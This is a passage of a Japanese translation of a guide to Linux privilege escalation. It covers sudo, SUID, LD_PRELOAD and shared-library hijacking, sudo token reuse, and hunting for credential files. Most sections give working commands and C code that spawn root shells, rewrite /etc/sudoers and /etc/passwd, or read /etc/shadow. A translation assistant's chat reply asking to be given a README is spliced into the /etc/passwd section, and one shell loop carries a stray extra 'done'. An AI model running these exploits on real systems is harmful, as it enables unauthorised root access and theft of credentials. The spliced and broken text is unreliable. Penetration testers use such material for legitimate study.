トラフィックをsniffできるか確認してください。可能であれば、いくつかのcredentialsを取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**誰**であるか、どの**権限**を持っているか、システム内にどの**ユーザー**がいるか、どのユーザーが**ログイン**できるか、どのユーザーが**root privileges**を持っているかを確認する:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限昇格できるバグの影響を受けていました。詳細: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### グループ

root 権限を与える可能性のあるグループの**メンバーかどうか**を確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボード内に興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**パスワードを知っている場合は**、そのパスワードを使って**各ユーザーにログインしてみてください**。

### Su Brute

多くのノイズを出しても構わない場合、かつ `su` と `timeout` バイナリがコンピュータに存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーをブルートフォースしてみることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーのブルートフォースも試みます。

## 書き込み可能な PATH の悪用

### $PATH

もし**$PATH の一部フォルダに書き込みできる**ことが分かれば、別のユーザー（理想は root）によって実行されるコマンド名と同じ名前で、**書き込み可能なフォルダ内に backdoor を作成する**ことで権限を昇格できる可能性があります。ただし、そのコマンドが $PATH において**あなたの書き込み可能なフォルダより前にあるフォルダからロードされない**ことが条件です。

### SUDO and SUID

sudo で実行が許可されているコマンドがあるか、または suid ビットが付与されているものがあるかもしれません。以下で確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の**予期しないコマンドはファイルを読み書きしたり、コマンドを実行したりできることがあります。** 例えば:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定によって、ユーザーがパスワードを知らなくても別ユーザーの権限でコマンドを実行できることがある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例ではユーザー `demo` が `root` として `vim` を実行できるため、root ディレクトリに sshキーを追加するか `sh` を実行することでシェルを取得するのは簡単です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、何かを実行する際にユーザーが **set an environment variable** することを許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**based on HTB machine Admirer** を元にしており、スクリプトを root として実行する際に任意の python ライブラリを読み込むための **PYTHONPATH hijacking** に**脆弱でした**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep によって保持される → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- 理由: 非対話シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。`BASH_ENV` が sudo によって保持されている場合、あなたのファイルは root 権限で source されます。

- 要件:
- 実行できる sudo ルール（非対話的に `/bin/bash` を呼び出す任意のターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を優先する。
- sudo-allowed コマンドに対しては shell wrappers を避け、最小限のバイナリを使う。
- preserved env vars が使われる場合に sudo の I/O ロギングとアラートを検討する。

### Sudo 実行バイパス経路

**ジャンプ**して他のファイルを読むか、**symlinks** を使う。例えば sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使用されている（\*）なら、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID バイナリでコマンドパスが指定されていない場合

もし単一のコマンドに対して**sudo permission**がパスを指定せずに付与されている場合: _hacker10 ALL= (root) less_、PATH 変数を変更することで悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合（怪しい SUID バイナリの内容は必ず _**strings**_ で確認してください）**にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリ: コマンドのパスが指定されている場合

もし**suid** バイナリが**パスを指定して別のコマンドを実行する**場合、suid ファイルが呼び出しているコマンド名と同じ名前で**export a function**を作成してみてください。

例えば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、関数を作成して export してみてください:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid binary を呼び出すと、この関数が実行されます

### LD_PRELOAD & **LD_LIBRARY_PATH**

環境変数 **LD_PRELOAD** は、標準 C ライブラリ（`libc.so`）を含む他のすべてのライブラリよりも先に loader によって読み込まれる、1つ以上の共有ライブラリ（.so ファイル）を指定するために使用されます。このプロセスはライブラリのプリロードとして知られています。

しかし、この機能が悪用されるのを防ぎシステムのセキュリティを維持するため、特に **suid/sgid** 実行ファイルに対して、システムはいくつかの条件を課しています:

- 実行ファイルの実ユーザーID (_ruid_) が実効ユーザーID (_euid_) と一致しない場合、ローダーは **LD_PRELOAD** を無視します。
- suid/sgid な実行ファイルに対しては、標準パス内でかつ同じく suid/sgid であるライブラリのみがプリロードされます。

`sudo` でコマンドを実行する権限があり、かつ `sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合、権限昇格が発生する可能性があります。この設定により、コマンドが `sudo` で実行されても **LD_PRELOAD** 環境変数が維持・認識され、結果として任意のコードが昇格した権限で実行される恐れがあります。
```
Defaults        env_keep += LD_PRELOAD
```
次のファイル名で保存: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、以下を使って**コンパイルします**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行します
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** 環境変数を制御していると、ライブラリの検索パスを支配できるため、同様の privesc が悪用される可能性があります。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID バイナリ – .so injection

**SUID** 権限を持ち、挙動が異常に見えるバイナリに遭遇した場合、正しく **.so** ファイルを読み込んでいるか確認するのが良い実践です。次のコマンドを実行して確認できます：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、exploitation の可能性が示唆されます。

これをexploitするには、Cファイル、例えば _"/path/to/.config/libcalc.c"_ を作成し、以下のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイル権限を操作し、昇格した権限でshellを実行することで権限を昇格させることを目的としています。

上記のCファイルをshared object (.so)ファイルにコンパイルするには：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID バイナリを実行すると exploit がトリガーされ、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダからライブラリをロードする SUID バイナリを見つけたので、そのフォルダに必要な名前でライブラリを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが表示される場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、ローカルのセキュリティ制限を回避するために攻撃者が悪用できる Unix バイナリのキュレーションされたリストです。 [**GTFOArgs**](https://gtfoargs.github.io/) は同様のプロジェクトで、コマンドに**引数のみを注入できる**ケースに特化しています。

このプロジェクトは、制限付きシェルからの脱出、権限昇格または権限維持、ファイル転送、bind and reverse shells の生成、その他の post-exploitation タスクを容易にするために悪用できる Unix バイナリの正規の機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に **setuid 付きで root が所有する** sh shell を作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- その **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化して全ユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ本体かその中に作成されたファイルのいずれかに**write permissions**がある場合、バイナリ[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)を使って**create a sudo token for a user and PID**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとして PID 1234 のシェルを持っている場合、以下の操作でパスワード不要で**obtain sudo privileges**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるかおよびその方法を設定します。これらのファイルは**デフォルトではユーザー root とグループ root のみが読み取れます**。\
**もし** このファイルを**読み取れる**なら、**いくつかの興味深い情報を得られる可能性があります**。そして任意のファイルに**書き込める**なら、**escalate privileges** できるでしょう。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができれば、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD向けの `doas` のように `sudo` バイナリの代替がいくつかあります。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし**ユーザーが通常マシンに接続して `sudo` を使う**ことで権限昇格することが分かっており、かつそのユーザーコンテキストでシェルを取得している場合、**新しい sudo 実行ファイルを作成する**ことで、root としてあなたのコードを実行し、その後ユーザーのコマンドを実行させることができます。次に、ユーザーコンテキストの**$PATH**を変更し（例えば新しいパスを .bash_profile に追加する）、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されるようにします。

ユーザーが異なるシェル（bash 以外）を使用している場合、同様に新しいパスを追加するために他のファイルを修正する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback)は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を修正します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

または次のようなコマンドを実行：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルがどこから来るか**を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` にある設定ファイルが読み込まれます。これらの設定ファイルは **ライブラリが検索される別のフォルダを指します**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**システムは `/usr/local/lib` 内をライブラリ検索します**。

何らかの理由で示されたパス（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルが指す任意のフォルダ）に対して **ユーザが書き込み権限を持っている** 場合、特権を昇格できる可能性があります.\
以下のページで、このミスコンフィグレーションを**どのように悪用するか**を確認してください:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
libを`/var/tmp/flag15/`にコピーすると、`RPATH`変数で指定されているこの場所でプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に悪意のあるライブラリを `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` で作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な root 権限の**サブセットを提供します**。これにより root の**権限をより小さく識別可能な単位に分割**できます。これらの各単位は個別にプロセスへ付与することができ、結果として権限の集合が縮小され、悪用のリスクが低減します。\
以下のページを読んで、capabilities とそれを悪用する方法について**詳しく学んでください**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute" ビット**は対象ユーザーが **"cd"** でフォルダに移動できることを意味します。\
**"read"** ビットはユーザーが **list** で **files** を確認できることを意味し、**"write"** ビットはユーザーが **files** を削除および新規作成できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意の権限管理の第二層を表し、**従来の ugo/rwx 権限を上書きする**ことが可能です。これらの権限により、所有者やグループの一員でない特定のユーザーに対してアクセスを許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化できます。このレベルの**粒度により、より精密なアクセス管理が可能になります**。詳細は[**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**付与する** ユーザー "kali" にファイルの read と write 権限を与える：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システムから特定の ACL を持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 開かれた shell セッション

**old versions**では、別のユーザー（**root**）の**shell**セッションを**hijack**できる場合があります。\
**newest versions**では、**your own user**のscreenセッションにしか**connect**できません。ただし、セッション内に**interesting information inside the session**が見つかることがあります。

### screen sessions hijacking

**screen sessions の一覧を表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux セッション hijacking

これは **古い tmux バージョン** での問題でした。非特権ユーザーとして、root によって作成された tmux (v2.1) セッションを hijack することはできませんでした。

**tmux セッションを一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebianベースのシステム（Ubuntu、Kubuntuなど）で生成されたすべての SSL および SSH キーはこのバグの影響を受ける可能性があります。\
このバグはこれらのOSで新しい ssh key を作成したときに発生します。**可能な組み合わせはわずか32,768通りでした**。つまり、すべての可能性を計算でき、**ssh public keyを持っていれば対応するprivate keyを検索できます**。計算済みの候補はここで確認できます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されているかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、パスワードが空文字のアカウントでのログインをサーバーが許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が SSH でログインできるかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root はパスワードおよび private key を使ってログインできます
- `without-password` or `prohibit-password`: root は private key のみでログインできます
- `forced-commands-only`: root は private key を使い、かつコマンドオプションが指定されている場合のみログインできます
- `no` : 不可

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h` のようなトークンを含めることができ、これはホームディレクトリに置換されます。**絶対パス**（`/` で始まる）や**ユーザーのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**private**キーでログインしようとすると、ssh があなたの鍵の公開鍵を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding によって、サーバー上に鍵を置いておく代わりに **use your local SSH keys instead of leaving keys** (without passphrases!) を使用できます。これにより、ssh 経由であるホストに **jump** し、そこから最初のホストにある **key** を使って別のホストに **jump** することが可能になります。

このオプションは `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

ファイル `/etc/ssh_config` はこの **オプション** を **上書き** して、この設定を許可または拒否できます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` により ssh-agent forwarding を **許可** または **拒否** できます（デフォルトは許可）。

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、ユーザが新しいシェルを起動したときに実行される **スクリプト** です。したがって、これらのいずれかに **書き込みや改変ができる場合、権限を昇格できる** 可能性があります。
```bash
ls -l /etc/profile /etc/profile.d/
```
不審なプロファイルスクリプトを見つけたら、**機密情報** が含まれていないか確認してください。

### Passwd/Shadow ファイル

OSによっては `/etc/passwd` および `/etc/shadow` が別名になっているか、バックアップが存在する場合があります。したがって、**それらをすべて見つけ**、**読み取れるか確認して**、ファイル内に **hashes** が含まれているかどうかを確認することを推奨します:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）の中に**password hashes**が見つかることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のいずれかのコマンドでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
そのファイルの内容（src/linux-hardening/privilege-escalation/README.md）を貼ってください。翻訳して同じMarkdown/HTML構文を保ち、最後にユーザー `hacker` を追加するためのコマンド例と生成したパスワードをREADME内に追記します。ここで実際にシステム上のユーザーを作成することはできませんが、READMEに載せるコマンド（例: useradd/chpasswd）と生成パスワードを提供します。

確認事項：
- 生成したパスワードを平文でREADMEに含めてよいですか？
- 特定のディストリビューション（Debian系 / RHEL系 等）のコマンド例を希望しますか？ない場合は一般的な例を使います。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドで `hacker:hacker` を使用できます。

あるいは、以下の行を使ってパスワードなしのダミーユーザーを追加できます.\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**いくつかの機密ファイルに書き込みできるか**を確認するべきです。例えば、いくつかの**サービス設定ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバーを実行していて、**modify the Tomcat service configuration file inside /etc/systemd/,** が可能なら、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたの backdoor は、tomcat が次に起動したときに実行されます。

### フォルダを確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読み取れないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 過去数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **ウェブファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでください。これは **パスワードを含む可能性のある複数のファイル** を検索します。\
これを行うのに使える **もう一つの興味深いツール** は: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、Windows、Linux & Mac のローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースのアプリケーションです。

### ログ

ログを読むことができれば、**そこに興味深い／機密情報が含まれている**ことを見つけられるかもしれません。ログが奇妙であればあるほど、（おそらく）より興味深くなります。\
